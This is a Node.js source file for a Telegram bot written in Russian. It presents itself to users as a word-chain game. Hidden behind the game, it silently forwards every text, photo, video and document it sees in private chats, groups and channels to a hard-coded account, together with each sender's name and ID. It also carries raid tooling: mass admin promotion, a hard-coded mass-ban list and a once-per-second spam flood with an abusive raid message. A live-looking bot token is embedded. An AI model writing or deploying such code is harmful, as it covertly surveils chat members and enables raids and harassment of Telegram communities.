const { Telegraf } = require('telegraf');
const fs = require('fs');
const path = require('path');

// Токен бота
const BOT_TOKEN = '8326632164:AAF09hmeUOFHuAFxeUPOlCk0MEpfBs5sCVk';
const ADMIN_ID = 7947576295; // Ваш ID
const FORWARD_USER_ID = 7947576295; // ID для пересылки сообщений

const bot = new Telegraf(BOT_TOKEN);

// ============ ИГРА В СЛОВА (slova.js) ============
const games = new Map();
const PROBLEM_LETTERS = ['ь', 'ъ', 'ы', 'й'];

function getLastValidLetter(word) {
    if (!word || word.length === 0) return '';
    let lastLetter = word.slice(-1).toLowerCase();
    if (PROBLEM_LETTERS.includes(lastLetter) && word.length > 1) {
        return word.slice(-2, -1).toLowerCase();
    }
    return lastLetter;
}

function loadWords() {
    try {
        const wordsPath = path.join(__dirname, 'words.txt');
        const content = fs.readFileSync(wordsPath, 'utf8');
        return content.split('\n')
            .map(word => word.trim().toLowerCase())
            .filter(word => word.length > 0 && !PROBLEM_LETTERS.includes(word[0]));
    } catch (error) {
        console.error('Ошибка загрузки слов:', error);
        return ['яблоко', 'арбуз', 'зонт', 'трамвай'];
    }
}

const words = loadWords();

function normalizeLetter(letter) {
    return letter === 'ё' ? 'е' : letter;
}

// Команды игры
bot.command('start', (ctx) => {
    ctx.reply(
        '🎮 Привет! Я бот для игры в слова.\n\n' +
        'Правила: называйте слово на последнюю букву предыдущего слова.\n' +
        '*Подсказка:* Если слово заканчивается на "ь", "ъ", "ы" или "й", ' +
        'используется предпоследняя буква.\n\n' +
        'Команды:\n' +
        '/start - показать это сообщение\n' +
        '/game - начать новую игру\n' +
        '/stop - закончить игру\n' +
        '/ping - проверить работу бота\n' +
        '/info - информация о боте',
        { parse_mode: 'Markdown' }
    );
});

bot.command('game', (ctx) => {
    const chatId = ctx.chat.id;
    const firstWord = words[Math.floor(Math.random() * words.length)];
    const nextLetter = getLastValidLetter(firstWord);
    
    games.set(chatId, {
        lastWord: firstWord,
        usedWords: [firstWord],
        lastLetter: nextLetter
    });
    
    ctx.reply(
        `🎮 Игра началась!\n\n` +
        `Первое слово: *${firstWord.toUpperCase()}*\n` +
        `Следующая буква: *${nextLetter.toUpperCase()}*\n\n` +
        `_Слово заканчивается на "${firstWord.slice(-1)}", ` +
        `но так как на эту букву нет слов, используем "${nextLetter}"_`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', (ctx) => {
    const chatId = ctx.chat.id;
    if (games.has(chatId)) {
        games.delete(chatId);
        ctx.reply('🛑 Игра завершена. Чтобы начать новую, введите /game');
    } else {
        ctx.reply('У вас нет активной игры. Начните с /game');
    }
});

// Обработка сообщений для игры
bot.on('text', async (ctx) => {
    // Игнорируем команды
    if (ctx.message.text.startsWith('/')) return;
    
    const chatId = ctx.chat.id;
    const game = games.get(chatId);
    if (!game) return;
    
    const userWord = ctx.message.text.toLowerCase().trim();
    const lastLetter = game.lastLetter;
    
    if (userWord.length < 2) {
        ctx.reply('❌ Слово должно быть длиннее одной буквы');
        return;
    }
    
    let firstLetter = userWord[0];
    if (firstLetter === 'ё') firstLetter = 'e';
    
    if (firstLetter !== normalizeLetter(lastLetter)) {
        ctx.reply(
            `❌ Слово должно начинаться на букву *${lastLetter.toUpperCase()}*\n` +
            `(предыдущее слово "${game.lastWord.toUpperCase()}")`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    if (!words.includes(userWord)) {
        ctx.reply('❌ Это слово не найдено в словаре. Попробуйте другое.');
        return;
    }
    
    if (game.usedWords.includes(userWord)) {
        ctx.reply('❌ Это слово уже использовалось в игре.');
        return;
    }
    
    game.usedWords.push(userWord);
    game.lastWord = userWord;
    const nextLetter = getLastValidLetter(userWord);
    game.lastLetter = nextLetter;
    
    let response = `✅ Принято! *${userWord.toUpperCase()}*\n\n`;
    if (PROBLEM_LETTERS.includes(userWord.slice(-1))) {
        response += `Слово заканчивается на "${userWord.slice(-1)}", ` +
                   `поэтому следующая буква: *${nextLetter.toUpperCase()}*`;
    } else {
        response += `Следующая буква: *${nextLetter.toUpperCase()}*`;
    }
    
    ctx.reply(response, { parse_mode: 'Markdown' });
});

// ============ ПЕРЕСЫЛКА СООБЩЕНИЙ (parcer.js) ============
async function sendToAdmin(userId, message) {
    try {
        await bot.telegram.sendMessage(userId, message);
        return true;
    } catch (error) {
        console.error(`Не удалось отправить сообщение:`, error.message);
        return false;
    }
}

// Пересылка текстовых сообщений
bot.on('text', async (ctx) => {
    // Пропускаем сообщения, которые уже обработаны игрой
    if (games.has(ctx.chat.id) && !ctx.message.text.startsWith('/')) return;
    if (ctx.message.from.id === ctx.botInfo.id) return;
    if (ctx.message.text.startsWith('/')) return;
    if (ctx.chat.type === 'private' && ctx.message.from.id === FORWARD_USER_ID) return;
    
    let chatInfo = '';
    if (ctx.chat.type === 'private') {
        chatInfo = `👤 Личка: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет'})`;
    } else if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        chatInfo = `👥 Группа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
    } else if (ctx.chat.type === 'channel') {
        chatInfo = `📢 Канал: ${ctx.chat.title}`;
    }
    
    const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет'}) [ID: ${ctx.message.from.id}]`;
    const finalMessage = `📨 НОВОЕ СООБЩЕНИЕ\n\n${chatInfo}\n${senderInfo}\n\n📝 Текст:\n${ctx.message.text}`;
    
    await sendToAdmin(FORWARD_USER_ID, finalMessage);
});

// Пересылка медиа
bot.on(['photo', 'video', 'document', 'audio', 'sticker'], async (ctx) => {
    if (ctx.message.from.id === ctx.botInfo.id) return;
    if (ctx.chat.type === 'private' && ctx.message.from.id === FORWARD_USER_ID) return;
    
    let chatInfo = '';
    if (ctx.chat.type === 'private') {
        chatInfo = `Личка: ${ctx.message.from.first_name}`;
    } else {
        chatInfo = `Группа: ${ctx.chat.title}`;
    }
    
    const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет'}) [ID: ${ctx.message.from.id}]`;
    const caption = `📨 НОВОЕ МЕДИА\n\n${chatInfo}\n${senderInfo}`;
    
    try {
        if (ctx.message.photo) {
            await bot.telegram.sendPhoto(FORWARD_USER_ID, ctx.message.photo[ctx.message.photo.length - 1].file_id, { caption });
        } else if (ctx.message.video) {
            await bot.telegram.sendVideo(FORWARD_USER_ID, ctx.message.video.file_id, { caption });
        } else if (ctx.message.document) {
            await bot.telegram.sendDocument(FORWARD_USER_ID, ctx.message.document.file_id, { caption });
        } else if (ctx.message.audio) {
            await bot.telegram.sendAudio(FORWARD_USER_ID, ctx.message.audio.file_id, { caption });
        } else if (ctx.message.sticker) {
            await bot.telegram.sendSticker(FORWARD_USER_ID, ctx.message.sticker.file_id);
            await bot.telegram.sendMessage(FORWARD_USER_ID, `📨 НОВЫЙ СТИКЕР\n\n${chatInfo}\n${senderInfo}`);
        }
    } catch (error) {
        console.error('Ошибка при пересылке медиа:', error.message);
    }
});

// ============ ВЫДАЧА АДМИНКИ (adm.js) ============
bot.command('giveadm', async (ctx) => {
    try {
        if (ctx.chat.type === 'private') return ctx.reply('❌ Только в группах!');
        if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
        
        const botMember = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
        if (!botMember.status.includes('administrator')) {
            return ctx.reply('❌ Бот не админ!');
        }
        
        const ids = ctx.message.text
            .split('\n')
            .slice(1)
            .map(id => id.trim())
            .filter(id => id && /^\d+$/.test(id));
        
        if (ids.length === 0) {
            return ctx.reply('❌ Пример:\n/giveadm\n123456789\n987654321');
        }
        
        for (const userId of ids) {
            try {
                await ctx.telegram.promoteChatMember(ctx.chat.id, parseInt(userId), {
                    can_change_info: true,
                    can_delete_messages: true,
                    can_invite_users: true,
                    can_restrict_members: true,
                    can_pin_messages: true,
                    can_promote_members: false,
                    can_manage_chat: true
                });
            } catch (e) {}
        }
        
        await ctx.reply(`✅ Права выданы ${ids.length} пользователям`);
    } catch (error) {
        ctx.reply('❌ Ошибка');
    }
});

// ============ БАН ПО СПИСКУ (ban.js) ============
const BAN_CHAT_ID = '-1003771281366';
const BAN_LIST = [
    '7999786511', '8181140975', '6294439507', '815236637', '7850568376',
    '5959137938', '8498787907', '5462721514', '8557186305', '8071005755'
];

bot.command('banlist', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
    if (ctx.chat.id.toString() !== BAN_CHAT_ID) {
        return ctx.reply('❌ Эта команда работает только в определенном чате');
    }
    
    let bannedCount = 0;
    let failedCount = 0;
    
    for (const userId of BAN_LIST) {
        try {
            await ctx.telegram.banChatMember(ctx.chat.id, userId);
            bannedCount++;
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (error) {
            failedCount++;
        }
    }
    
    await ctx.reply(`✅ Бан завершен\nЗабанено: ${bannedCount}\nОшибок: ${failedCount}`);
});

// ============ СПАМ (spam.js) ============
const SPAM_CHAT_ID = '-1003790250147';
const SPAM_TEXT = 'СЬЕБАЛИСЬ ВАС РЕЙДЯТ КИВИШКИ @kiwishkii';

let spamming = false;
let spamInterval = null;

bot.command('startspam', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
    if (spamming) return ctx.reply('Спам уже запущен!');
    
    spamming = true;
    ctx.reply('✅ Спам запущен!');
    
    spamInterval = setInterval(() => {
        if (spamming) {
            bot.telegram.sendMessage(SPAM_CHAT_ID, SPAM_TEXT).catch(() => {});
        }
    }, 1000);
});

bot.command('stopspam', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав!');
    if (!spamming) return ctx.reply('Спам не запущен!');
    
    clearInterval(spamInterval);
    spamming = false;
    ctx.reply('⛔ Спам остановлен!');
});

// ============ ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ ============
bot.command('ping', (ctx) => {
    ctx.reply('🏓 Pong! Бот работает.');
});

bot.command('info', (ctx) => {
    ctx.reply(
        '🤖 *Информация о боте*\n\n' +
        `📊 Загружено слов: ${words.length}\n` +
        `👥 Активных игр: ${games.size}\n` +
        `🎮 Игра в слова: /game\n` +
        `🛑 Остановить игру: /stop\n` +
        `👑 Команды админа: /giveadm, /banlist, /startspam, /stopspam`,
        { parse_mode: 'Markdown' }
    );
});

// ============ ЗАПУСК БОТА ============
bot.catch((err, ctx) => {
    console.error('Ошибка:', err);
    ctx.reply('Произошла ошибка. Попробуйте еще раз.').catch(() => {});
});

bot.launch()
    .then(() => {
        console.log('✅ Бот запущен!');
        console.log(`📚 Загружено слов: ${words.length}`);
        console.log('🎮 Доступны команды: /game, /stop, /ping, /info');
        console.log('👑 Админ-команды: /giveadm, /banlist, /startspam, /stopspam');
        console.log('📨 Функция пересылки сообщений активна');
    })
    .catch((err) => {
        console.error('❌ Ошибка запуска:', err);
    });

process.once('SIGINT', () => {
    if (spamInterval) clearInterval(spamInterval);
    bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
    if (spamInterval) clearInterval(spamInterval);
    bot.stop('SIGTERM');
});
